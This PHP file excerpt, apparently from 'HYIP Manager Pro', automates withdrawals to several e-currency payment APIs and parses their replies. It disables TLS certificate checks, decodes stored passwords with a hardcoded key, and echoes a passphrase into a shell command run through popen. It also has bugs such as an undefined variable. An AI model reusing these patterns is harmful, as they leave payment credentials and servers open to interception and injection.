      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to eeeCureency account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid eeeCurrency account', '');
    }

    list ($sts, $error) = check_ext_accounts_blacklist ($account, 8);
    if ($sts == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $error . '\'';
      mysql_query ($q);
      return array (0, $error);
    }

    if (function_exists ('curl_init'))
    {
      if ($e_password == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'eeecurrency_password\'';
        $sth = mysql_query ($q);
        while ($row = mysql_fetch_array ($sth))
        {
          $eeecurrency_password = mydecode_sting ($row['v'], 'hyip manager pro 2005 jul 27');
        }

        $q = 'select v from hm2_pay_settings where n=\'eeecurrency_transaction_code\'';
        $sth = mysql_query ($q);
        while ($row = mysql_fetch_array ($sth))
        {
          $eeecurrency_code = mydecode_sting ($row['v'], 'hyip manager pro 2005 jul 27');
        }
      }
      else
      {
        list ($eeecurrency_password, $eeecurrency_code) = preg_split ('/\\|/', $e_password);
      }

      $ch = curl_init ();
      $memo = rawurlencode ($memo);
      curl_setopt ($ch, CURLOPT_URL, 'https://eeecurrency.com/cgi-bin/autopay.cgi');
      curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($ch, CURLOPT_POST, 1);
      curl_setopt ($ch, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)');
      curl_setopt ($ch, CURLOPT_POSTFIELDS, 'ACCOUNTID=' . rawurlencode ($settings['eeecurrency_from_account']) . '&PASSWORD=' . rawurlencode ($eeecurrency_password) . '&SECPASSWORD=' . rawurlencode ($eeecurrency_code) . '&RECEIVER=' . rawurlencode ($account) . '&AMOUNT=' . rawurlencode ($amount) . ('' . '&NOTE=' . $memo));
      curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($ch);
      curl_close ($ch);
      $parts = array ();
      if (preg_match ('' . '/Success\\s*TRANSACTION_ID:(.*?)$/ims', $a, $parts))
      {
        return array (1, '', $parts[1]);
      }
      else
      {
        $e = quote ('' . $error_txt . ' ' . $a);
        $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
        mysql_query ($q);
        return array (0, $error_txt . ('' . ' ' . $a), '');
      }
    }
    else
    {
      $e = quote ('' . $error_txt . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $error_txt . ' Curl functions are not available');
    }

  }

  function send_money_to_pecunix ($e_password, $amount, $account, $memo, $error_txt)
  {
    global $settings;
    if ($settings['site_name'] == 'free')
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($settings['demomode'] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($account == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to empty Pecunix account.\'';
      mysql_query ($q);
      return array (0, 'Invalid Pecunix account', '');
    }

    list ($sts, $error) = check_ext_accounts_blacklist ($account, 9);
    if ($sts == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $error . '\'';
      mysql_query ($q);
      return array (0, $error);
    }

    if (function_exists ('curl_init'))
    {
      if ($e_password == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'pecunix_password\'';
        $sth = mysql_query ($q);
        while ($row = mysql_fetch_array ($sth))
        {
          $pecunix_password = mydecode_sting ($row['v'], 'hyip manager pro 2005 jul 27');
        }
      }
      else
      {
        $pecunix_password = $e_password;
      }

      $ch = curl_init ();
      $date = sha256g ('{px_time}');
      $token = strtoupper (md5 ($pecunix_password . ':' . $date));
      $data = '
    <TransferRequest>
      <Transfer>
        <TransferId> </TransferId>
        <Payer> ' . htmlentities ($settings['pecunix_from_account'], ENT_NOQUOTES) . ' </Payer>
        <Payee> ' . htmlentities ($account, ENT_NOQUOTES) . ' </Payee>
        <CurrencyId> GAU </CurrencyId>
        <Equivalent>
          <CurrencyId> USD </CurrencyId>
          <Amount> ' . htmlentities ($amount, ENT_NOQUOTES) . ' </Amount>
        </Equivalent>
        <FeePaidBy> Payee </FeePaidBy>
        <Memo> ' . htmlentities ($memo, ENT_NOQUOTES) . ('' . ' </Memo>
      </Transfer>
      <Auth>
        <Token> ' . $token . ' </Token>
      </Auth>
    </TransferRequest>
    ');
      $ch = curl_init ();
      curl_setopt ($ch, CURLOPT_URL, 'https://pxi.pecunix.com/money.refined...transfer');
      curl_setopt ($ch, CURLOPT_POST, 1);
      curl_setopt ($ch, CURLOPT_POSTFIELDS, $data);
      curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($ch);
      curl_close ($ch);
      $out = parsexml_pecunix ($a);
      if ($out['status'] == 'ok')
      {
        return array (1, '', $out['batch']);
      }
      else
      {
        if ($out['status'] == 'error')
        {
          $e = quote ('' . $error_txt . ' ' . $out['text'] . ' ' . $out['additional']);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
        else
        {
          $e = quote ('' . $error_txt . ' Parse error: ' . $a);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
      }
    }
    else
    {
      $e = quote ('' . $error_txt . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $error_txt . ' Curl functions are not available');
    }

  }

  function send_money_to_libertyreserve ($e_password, $amount, $account, $memo, $error_txt)
  {
    global $settings;
    if ($settings['site_name'] == 'free')
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($settings['demomode'] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($account == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to empty LibertyReserve account.\'';
      mysql_query ($q);
      return array (0, 'Invalid LibertyReserve account', '');
    }

    list ($sts, $error) = check_ext_accounts_blacklist ($account, 15);
    if ($sts == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $error . '\'';
      mysql_query ($q);
      return array (0, $error);
    }

    if (function_exists ('curl_init'))
    {
      if ($e_password == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'libertyreserve_password\'';
        $sth = mysql_query ($q);
        while ($row = mysql_fetch_array ($sth))
        {
          $libertyreserve_password = mydecode_sting ($row['v'], 'hyip manager pro 2005 jul 27');
        }

        $libertyreserve_code = $settings['libertyreserve_apiname'];
      }
      else
      {
        list ($libertyreserve_password, $libertyreserve_code) = preg_split ('/\\|/', $e_password);
      }

      $ch = curl_init ();
      $token = strtoupper (sha256g ($libertyreserve_password . ':{lr_time}'));
      $data = '<TransferRequest id="' . rand (1000000, 9999999) . '">
  <Auth>
    <ApiName>' . htmlspecialchars ($libertyreserve_code) . ('' . '</ApiName>
    <Token>' . $token . '</Token>
  </Auth>
  <Transfer>
    <TransferType>transfer</TransferType>
    <Payer>') . htmlentities ($settings['libertyreserve_from_account'], ENT_NOQUOTES) . '</Payer>
    <Payee>' . htmlentities ($account, ENT_NOQUOTES) . '</Payee>
    <CurrencyId>' . htmlentities ($settings['liberty_currency']) . '</CurrencyId>
    <Amount>' . htmlentities ($amount, ENT_NOQUOTES) . '</Amount>
    <Memo>' . htmlentities ($memo, ENT_NOQUOTES) . '</Memo>
    <Anonymous>false</Anonymous>
  </Transfer>
</TransferRequest>';
      $ch = curl_init ();
      curl_setopt ($ch, CURLOPT_URL, 'https://api.libertyreserve.com/xml/transfer.aspx?req=' . urlencode ($data));
      curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
      $headers = array ('User-Agent: Mozilla/5.0');
      curl_setopt ($ch, CURLOPT_HTTPHEADER, $headers);
      $a = curl_exec ($ch);
      curl_close ($ch);
      $settings['__debug_data'] = $data;
      $settings['__debug_out'] = $a;
      $out = parsexml_libertyreserve ($a);
      if ($out['status'] == 'ok')
      {
        return array (1, '', $out['batch']);
      }
      else
      {
        if ($out['status'] == 'error')
        {
          $e = quote ('' . $error_txt . ' ' . $out['text'] . '<br>' . $out['additional']);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
        else
        {
          $e = quote ('' . $error_txt . ' Parse error: ' . $a);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
      }
    }
    else
    {
      $e = quote ('' . $error_txt . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $error_txt . ' Curl functions are not available');
    }

  }

  function send_money_to_vmoney ($e_password, $amount, $account, $memo, $error_txt)
  {
    global $settings;
    if ($settings['site_name'] == 'free')
    {
    }

    if ($settings['demomode'] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($account == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to empty V-Money account.\'';
      mysql_query ($q);
      return array (0, 'Invalid V-Money account', '');
    }

    list ($sts, $error) = check_ext_accounts_blacklist ($account, 16);
    if ($sts == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $error . '\'';
      mysql_query ($q);
      return array (0, $error);
    }

    if (function_exists ('curl_init'))
    {
      if ($e_password == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'vmoney_password\'';
        $sth = mysql_query ($q);
        while ($row = mysql_fetch_array ($sth))
        {
          $vmoney_password = mydecode_sting ($row['v'], 'hyip manager pro 2005 jul 27');
        }
      }
      else
      {
        $vmoney_password = $e_password;
      }

      $token = md5 ($settings['vmoney_from_account'] . $vmoney_password . sha256g ('{vm_time}'));
      $data = '<Request>
	<Type>Transfer</Type>
	<Auth>
		<AccountId>' . htmlentities ($settings['vmoney_from_account'], ENT_NOQUOTES) . ('' . '</AccountId>
		<Token>' . $token . '</Token>
	</Auth>
	<Transfers>
		<Transfer>
			<ID>1</ID>
			<Payee>') . htmlentities ($account, ENT_NOQUOTES) . '</Payee>
			<Amount>' . htmlentities ($amount, ENT_NOQUOTES) . '</Amount>
			<Memo>' . htmlentities ($memo, ENT_NOQUOTES) . '</Memo>
		</Transfer>
	</Transfers>
        </Request>';
      $ch = curl_init ();
      curl_setopt ($ch, CURLOPT_URL, 'https://www.v-money.net/vai.php');
      curl_setopt ($ch, CURLOPT_POST, 1);
      curl_setopt ($ch, CURLOPT_POSTFIELDS, 'request_data=' . $data);
      curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($ch);
      curl_close ($ch);
      $out = parsexml_vmoney ($a);
      if ($out['status'] == 'ok')
      {
        return array (1, '', $out['batch']);
      }
      else
      {
        if ($out['status'] == 'error')
        {
          $e = quote ('' . $error_txt . ' ' . $out['text']);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
        else
        {
          $e = quote ('' . $error_txt . ' Parse error: ' . $a);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
      }
    }
    else
    {
      $e = quote ('' . $error_txt . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $error_txt . ' Curl functions are not available');
    }

  }

  function parsexml_evowallet ($xmlcert)
  {
    $out = array ();
    $verifylist = getelement ($xmlcert, 'response');
    if ($verifylist != '')
    {
      $Verify = $verifylist;
      $out['status'] = getelement ($Verify, 'status');
      $out['text'] = getelement ($Error, 'statusmsg');
      $out['batch'] = getelement ($Verify, 'batch');
      $out['payer'] = getelement ($Verify, 'fromaccount');
      $out['payee'] = getelement ($Verify, 'toaccount');
      $out['amount'] = getelement ($Verify, 'amount');
      $out['currency'] = getelement ($Verify, 'currency');
      $out['checksum'] = getelement ($Verify, 'checksum');
      if ($out['status'] == 0)
      {
        $out['status'] = 'ok';
      }
    }

    if (0 < $out['status'])
    {
      switch ($out['status'])
      {
        case 10310:
        {
          $out['text'] = '10310: Invalid Account Prefix';
          break;
        }

        case 10311:
        {
          $out['text'] = '10311: Payer account has been suspended';
          break;
        }

        case 10312:
        {
          $out['text'] = '10312: API transfer disabled';
          break;
        }

        case 10313:
        {
          $out['text'] = '10313: Payee account not found';
          break;
        }

        case 10314:
        {
          $out['text'] = '10314: Payer spending over daily limit';
          break;
        }

        case 10315:
        {
          $out['text'] = '10315: Payee account has been suspended';
          break;
        }

        case 10316:
        {
          $out['text'] = '10316: Payee account has been limited';
          break;
        }

        case 10317:
        {
          $out['text'] = '10317: Spending less than minimum allowed';
          break;
        }

        case 10318:
        {
          $out['text'] = '10318: Payee will reach their balance limit';
          break;
        }

        case 10319:
        {
          $out['text'] = '10319: Payer do not have enough funds';
          break;
        }

        case 10320:
        {
          $out['text'] = '10320: Payee has an invalid balance security check';
          break;
        }

        case 10321:
        {
          $out['text'] = '10321: Spend was not complete';
          break;
        }

        case 10322:
        {
          $out['text'] = '10322: Payee account group not found';
          break;
        }

        case 10323:
        {
          $out['text'] = '10323: Invalid payee account';
          break;
        }

        case 10324:
        {
          $out['text'] = '10324: Invalid IP range';
          break;
        }

        case 10325:
        {
          $out['text'] = '10325: Invalid API or not enabled';
          break;
        }

        case 10326:
        {
          $out['text'] = '10326: Payer account group not found';
          break;
        }

        case 10327:
        {
          $out['text'] = '10327: Invalid payer account';
          break;
        }

        case 10328:
        {
          $out['text'] = '10328: Invalid checksum';
          break;
        }

        case 10110:
        {
          $out['text'] = '10110: Invalid Account Prefix';
          break;
        }

        case 10111:
        {
          $out['text'] = '10111: Account has been suspended';
          break;
        }

        case 10112:
        {
          $out['text'] = '10112: Invalid API or API not enabled';
          break;
        }

        case 10113:
        {
          $out['text'] = '10113: API balance query disabled';
          break;
        }

        case 10114:
        {
          $out['text'] = '10114: IP not in the allowed range';
          break;
        }

        case 10115:
        {
          $out['text'] = '10115: Balance can not be retrieved';
          break;
        }

        case 10116:
        {
          $out['text'] = '10116: Reserve';
          break;
        }

        case 10117:
        {
          $out['text'] = '10117: Account group not found';
          break;
        }

        case 10118:
        {
          $out['text'] = '10118: This account can not be found';
          break;
        }

        case 10119:
        {
          $out['text'] = '10119: Invalid Checksum';
          break;
        }
      }

      $out['status'] = 'error';
    }

    return $out;
  }

  function send_money_to_evowallet ($e_password, $amount, $account, $memo, $error_txt, $cur = 'USD')
  {
    global $settings;
    if ($settings['site_name'] == 'free')
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($settings['demomode'] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($account == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to empty EvoWallet account.\'';
      mysql_query ($q);
      return array (0, 'Invalid EvoWallet account', '');
    }

    list ($sts, $error) = check_ext_accounts_blacklist ($account, 24);
    if ($sts == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $error . '\'';
      mysql_query ($q);
      return array (0, $error);
    }

    if (function_exists ('curl_init'))
    {
      if ($e_password == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'evowallet_password\'';
        $sth = mysql_query ($q);
        while ($row = mysql_fetch_array ($sth))
        {
          $evowallet_password = mydecode_sting ($row['v'], 'hyip manager pro 2005 jul 27');
        }

        $evowallet_code = $settings['evowallet_apiname'];
      }
      else
      {
        list ($evowallet_password, $evowallet_code) = preg_split ('/\\|/', $e_password);
      }

      $ch = curl_init ();
      $trandate = date ('YmdHis');
      $checksum = strtoupper (md5 ($evowallet_code . $trandate . '103' . '' . $cur . $settings['evowallet_from_account'] . $account . $amount . md5 ($evowallet_password)));
      $data = '<?xml version="1.0" encoding="utf-8"?>
<request>
<apiname>' . htmlentities ($evowallet_code, ENT_NOQUOTES) . '</apiname>
<trandate>' . $trandate . '</trandate>
<trantype>103</trantype>
<tranid></tranid>
<curcode>' . $cur . '</curcode>
<fromaccount>' . htmlentities ($settings['evowallet_from_account'], ENT_NOQUOTES) . '</fromaccount>
<toaccount>' . htmlentities ($account, ENT_NOQUOTES) . '</toaccount>
<amount>' . htmlentities ($amount, ENT_NOQUOTES) . '</amount>
<memo>' . htmlentities ($memo, ENT_NOQUOTES) . '</memo> 
<checksum>' . $checksum . '</checksum> 
</request>';
      $ch = curl_init ();
      curl_setopt ($ch, CURLOPT_URL, 'https://www.evowallet.com/api.php?req=' . urlencode ($data));
      curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($ch);
      curl_close ($ch);
      $out = parsexml_evowallet ($a);
      if ($out['status'] == 'ok')
      {
        return array (1, '', $out['batch']);
      }
      else
      {
        if ($out['status'] == 'error')
        {
          $e = quote ('' . $error_txt . ' ' . $out['text'] . '<br>' . $out['additional']);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
        else
        {
          $e = quote ('' . $error_txt . ' Parse error: ' . $a);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
      }
    }
    else
    {
      $e = quote ('' . $error_txt . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $error_txt . ' Curl functions are not available');
    }

  }

  function send_money_to_altergold ($a_password, $amount, $account, $memo, $error_txt)
  {
    global $settings;
    if ($settings['site_name'] == 'free')
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($settings['demomode'] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($account == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to AlterGold account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid AlterGold account', '');
    }

    list ($sts, $error) = check_ext_accounts_blacklist ($account, 17);
    if ($sts == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $error . '\'';
      mysql_query ($q);
      return array (0, $error);
    }

    if (function_exists ('curl_init'))
    {
      if ($a_password == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'altergold_password\'';
        $sth = mysql_query ($q);
        while ($row = mysql_fetch_array ($sth))
        {
          $altergold_password = mydecode_sting ($row['v'], 'hyip manager pro 2005 jul 27');
        }
      }
      else
      {
        $altergold_password = $a_password;
      }

      $ch = curl_init ();
      $memo = rawurlencode ($memo);
      curl_setopt ($ch, CURLOPT_URL, 'https://api.altergold.com/spend.php');
      curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($ch, CURLOPT_POST, 1);
      curl_setopt ($ch, CURLOPT_POSTFIELDS, 'PAYER_ACCOUNT=' . rawurlencode ($settings['altergold_from_account']) . '&PAYER_PASSWORD=' . rawurlencode ($altergold_password) . '&PAYEE_ACCOUNT=' . rawurlencode ($account) . '&PAYMENT_AMOUNT=' . rawurlencode ($amount) . ('' . '&PAYMENT_CURRENCY=USD&MEMO=' . $memo));
      curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($ch);
      curl_close ($ch);
      if ($a == '')
      {
        print 'Blank response from Altergold processor service.';
      }
      else
      {
        $errors = array ('E10011' => 'Unable to Login as Payer. This means wrong login information was provided.', 'E10012' => 'Payer is not allowed to make outgoing spends. Means account is suspended or perhaps limited.', 'E10013' => 'API Automated Spends not Enabled.', 'E10014' => 'Unable to authorize IP address.', 'E10015' => 'Recipient account not found', 'E10016' => 'Recipient account is suspended.', 'E10017' => 'Invalid spend units.', 'E10018' => 'Spend amount is too low.', 'E10019' => 'Recipient reached balance limit.', 'E10020' => 'Not enough funds.', 'E10021' => '* Please contact support.');
        if ($errors[$a] != '')
        {
          $e = quote ('' . $error_txt . ' ' . $errors[$a]);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $error_txt . ('' . ' ' . $errors[$a]), '');
        }
        else
        {
          return array (1, '', $a);
        }
      }
    }
    else
    {
      $e = quote ('' . $error_txt . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $error_txt . ' Curl functions are not available');
    }

  }

  function send_money_to_ebullion ($dump, $amount, $account, $memo, $error_txt, $ec)
  {
    global $settings;
    if ($settings['site_name'] == 'free')
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($settings['demomode'] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($account == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to e-Bullion account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid e-Bullion account', '');
    }

    list ($sts, $error) = check_ext_accounts_blacklist ($account, 5);
    if ($sts == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $error . '\'';
      mysql_query ($q);
      return array (0, $error);
    }

    if (function_exists ('curl_init'))
    {
      $payment = '<atip.batch.v1><payment.list>';
      $payment = $payment . '<payment>';
      $payment = $payment . '<payer>' . htmlentities ($settings['def_payee_account_ebullion'], ENT_NOQUOTES) . '</payer>';
      $payment = $payment . '<payee>' . htmlentities ($account, ENT_NOQUOTES) . '</payee>';
      $payment = $payment . '<amount>' . htmlentities ($amount, ENT_NOQUOTES) . '</amount>';
      $payment = $payment . '<metal>' . ($ec == 5 ? 1 : 3) . '</metal>';
      $payment = $payment . '<unit>1</unit>';
      $payment = $payment . '<memo>' . htmlentities ($memo, ENT_NOQUOTES) . '</memo>';
      $payment = $payment . '<ref></ref>';
      $payment = $payment . '</payment>';
      $payment = $payment . '</payment.list></atip.batch.v1>';
      $infile = tempnam ('./tmpl_c/', 'in.');
      $outfile = tempnam ('./tmpl_c/', 'out.');
      $fd = fopen ($infile, 'w');
      fwrite ($fd, $payment);
      fclose ($fd);
      $atippath = './tmpl_c/';
      $gpg_path = escapeshellcmd ($settings['gpg_path']);
      $passphrase = mydecode_sting ($settings['md5altphrase_ebullion'], 'hyip manager pro 2005 jul 27');
      $atip_status_url = $settings['site_url'];
      $gpg_options = '' . ' --yes --no-tty --no-secmem-warning --no-options --no-default-keyring --batch --homedir ' . $atippath . ' --keyring=pubring.gpg --secret-keyring=secring.gpg --armor --throw-keyid --always-trust --passphrase-fd 0';
      $gpg_command = '' . 'echo \'' . $passphrase . '\' | ' . $gpg_path . ' ' . $gpg_options . ' --recipient A20077\\@e-bullion.com --local-user ' . $settings['def_payee_account_ebullion'] . ('' . '\\@e-bullion.com --output ' . $outfile . ' --sign --encrypt ' . $infile . ' 2>&1');
      $buf = '';
      $fp = popen ('' . $gpg_command, 'r');
      while (!feof ($fp))
      {
        $buf = fgets ($fp, 4096);
      }

      pclose ($fp);
      $fd = fopen ($outfile, 'r');
      $atip_batch_msg = fread ($fd, filesize ($outfile));
      fclose ($fd);
      unlink ($infile);
      unlink ($outfile);
      $qs = 'ATIP_ACCOUNT=' . rawurlencode ($settings['def_payee_account_ebullion']) . '&ATIP_BATCH_MSG=' . rawurlencode ($atip_batch_msg) . '&ATIP_STATUS_URL=' . rawurlencode ($atip_status_url);
      $ch = curl_init ();
      curl_setopt ($ch, CURLOPT_URL, '' . 'https://atip.e-bullion.com/batch.php?' . $qs);
      curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt ($ch, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)');
      curl_setopt ($ch, CURLOPT_HEADER, 1);
      $a = curl_exec ($ch);
      curl_close ($ch);
      $matches = array ();
      $verification = '';
      if (preg_match ('/Location: .*?\\?ATIP_VERIFICATION=([^\\r\\n]+)%0A/', $a, $matches))
      {
        $verification = $matches[1];
      }

      $verification = urldecode ($verification);
      $xmlfile = tempnam ('./tmpl_c/', 'xml.cert.');
      $tmpfile = tempnam ('./tmpl_c/', 'xml.tmp.');
      $fd = fopen ('' . $tmpfile, 'w');
      fwrite ($fd, $verification);
      fclose ($fd);
      $gpg_options = '' . ' --yes --no-tty --no-secmem-warning --no-options --no-default-keyring --batch --homedir ' . $atippath . ' --keyring=pubring.gpg --secret-keyring=secring.gpg --armor --passphrase-fd 0';
      $gpg_command = '' . 'echo \'' . $passphrase . '\' | ' . $gpg_path . ' ' . $gpg_options . ' --output ' . $xmlfile . ' --decrypt ' . $tmpfile . ' 2>&1';
      $buf = '';
      $keyID = '';
      $fp = popen ('' . $gpg_command, 'r');
      while (!feof ($fp))
      {
        $buf = fgets ($fp, 4096);
        $pos = strstr ($buf, 'key ID');
        if (0 < strlen ($pos))
        {
          $keyID = preg_replace ('/[\\n\\r]/', '', substr ($pos, 7));
          continue;
        }
      }

      pclose ($fp);
      if ($keyID == $settings['ebullion_keyID'])
      {
        if (is_file ('' . $xmlfile))
        {
          $fx = fopen ('' . $xmlfile, 'r');
          $xmlcert = fread ($fx, filesize ('' . $xmlfile));
          fclose ($fx);
        }
        else
        {
          $e = quote ('' . $error_txt . ' Can not found decrypted verification response!');
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $error_txt . ' Can not found decrypted verification response!', '');
        }

        $data = parsexml ($xmlcert);
        if ($data['status'] == 'ok')
        {
          return array (1, '', $data['batch']);
        }
        else
        {
          if ($data['status'] == 'error')
          {
            $e = quote ('' . $error_txt . ' ' . $data['text'] . ' ' . $data['additional']);
            $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
            mysql_query ($q);
            return array (0, $error_txt . $data['text'] . ' ' . $data['additional']);
          }
          else
          {
            $e = quote ('' . $error_txt . ' Unknown error');
            $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
            mysql_query ($q);
            return array (0, $error_txt . ' Unknown error', '');
          }
        }
      }
      else
      {
        $e = quote ('' . $error_txt . ' Can not decrypt verification response! ');
        $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
        mysql_query ($q);
        return array (0, $error_txt . ' Can not decrypt verification response!', '');
      }

      unlink ($tmpfile);
      unlink ($xmlfile);
    }
    else
    {
      $e = quote ('' . $error_txt . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $error_txt . ' Curl functions are not available', '');
    }

  }

  function getelement ($data, $element)
  {
    $element = strtolower ($element);
    $elementlen = strlen ($element) + 2;
    if ($startat = strpos ($data, '' . '<' . $element . '>') === false)
    {
      return '';
    }

    if ($endat = strpos ($data, '' . '</' . $element . '>') === false)
    {
      return '';
    }

    $value = trim (substr ($data, $startat + $elementlen, $endat - ($startat + $elementlen)));
    return $value;
  }

  function parsexml ($xmlcert)
  {
    $out = array ();
    $balancelist = getelement ($xmlcert, 'balanceresponse.list');
    if ($balancelist != '')
    {
      $out['status'] = 'balance';
      $done = false;
      if ($starttemp = stristr ($balancelist, '<balance>') === false)
      {
        $done = true;
      }
      else
      {
        $startat = strlen ($balancelist) - strlen ($starttemp);
      }

      if ($endtemp = stristr ($balancelist, '</balance>') === false)
      {
        $done = true;
      }
      else
      {
        $endat = strlen ($balancelist) - strlen ($endtemp);
      }

      while (!$done)
      {
        $Balance = trim (substr ($balancelist, $startat + 9, $endat - 9));
        $balancelist = trim (substr ($balancelist, $endat + 10));
        $out['amount'] = getelement ($Balance, 'amount');
        if ($starttemp = stristr ($balancelist, '<balance>') === false)
        {
          $done = true;
        }
        else
        {
          $startat = strlen ($balancelist) - strlen ($starttemp);
        }

        if ($endtemp = stristr ($balancelist, '</balance>') === false)
        {
          $done = true;
          continue;
        }
        else
        {
          $endat = strlen ($balancelist) - strlen ($endtemp);
          continue;
        }
      }
    }

    $verifylist = getelement ($xmlcert, 'verified.list');
    if ($verifylist != '')
    {
      $out['status'] = 'ok';
      $done = false;
      if ($starttemp = stristr ($verifylist, '<transaction>') === false)
      {
        $done = true;
      }
      else
      {
        $startat = strlen ($verifylist) - strlen ($starttemp);
      }

      if ($endtemp = stristr ($verifylist, '</transaction>') === false)
      {
        $done = true;
      }
      else
      {
        $endat = strlen ($verifylist) - strlen ($endtemp);
      }

      while (!$done)
      {
        $Verify = trim (substr ($verifylist, $startat + 13, $endat - 13));
        $verifylist = trim (substr ($verifylist, $endat + 14));
        $out['batch'] = getelement ($Verify, 'id');
        $out['payee'] = getelement ($Verify, 'payee');
        $out['payer'] = getelement ($Verify, 'payer');
        $out['amount'] = getelement ($Verify, 'amount');
        $out['metal'] = getelement ($Verify, 'metal');
        $out['unit'] = getelement ($Verify, 'unit');
        $out['memo'] = getelement ($Verify, 'memo');
        $out['exchange'] = getelement ($Verify, 'exchange');
